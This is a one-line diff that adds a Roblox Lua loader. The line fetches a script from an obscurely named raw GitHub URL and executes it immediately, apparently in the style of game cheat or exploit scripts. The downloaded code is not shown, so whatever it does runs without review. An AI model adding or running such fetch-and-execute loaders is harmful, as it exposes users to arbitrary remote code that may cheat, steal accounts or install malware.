@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AmeloxRUS/wqeewqewq/refs/heads/main/ewewe"))()
